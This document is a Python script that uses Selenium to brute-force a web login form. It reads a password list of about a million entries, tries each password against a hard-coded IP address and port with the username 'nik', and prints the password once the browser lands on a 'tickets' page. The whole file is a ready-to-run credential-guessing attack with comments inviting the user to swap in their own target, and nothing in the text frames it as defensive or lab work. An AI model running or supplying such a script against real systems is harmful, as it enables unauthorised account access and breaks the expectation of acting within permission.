from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import time


# Function to read passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [password.strip() for password in passwords]


# Initialize WebDriver (ensure you have the appropriate WebDriver in your PATH)
driver = webdriver.Chrome()

# Define the target URL and the password list file
target_url = 'http://141.87.60.189:40434/login'  # Replace with your target URL
password_list_file = '10-million-password-list-top-1000000.txt'  # Replace with your password list file path

# Read the passwords from the file
passwords = read_passwords(password_list_file)

# Open the target URL
driver.get(target_url)

# Define the username to test
username = 'nik'  # Replace with the username to test

# Define explicit wait
wait = WebDriverWait(driver, 1)

# Brute force the login
for password in passwords:
    try:
        # Locate the username and password fields (modify these selectors as per your webpage)
        username_field = wait.until(EC.presence_of_element_located((By.NAME, 'Username')))
        password_field = driver.find_element(By.NAME, 'Password')
        login_button = driver.find_element(By.CLASS_NAME, 'login')

        # Clear the fields
        username_field.clear()
        password_field.clear()

        # Enter the username and password
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Click the login button
        login_button.click()

        # Check if login was successful
        if "tickets" in driver.current_url:
            print(f'Success! Username: {username}, Password: {password}')
            break
        else:
            print(f'Failed attempt with password: {password}')
    except (NoSuchElementException, TimeoutException) as e:
        print(f"Error occurred: {e}")
        break

# Close the browser
driver.quit()
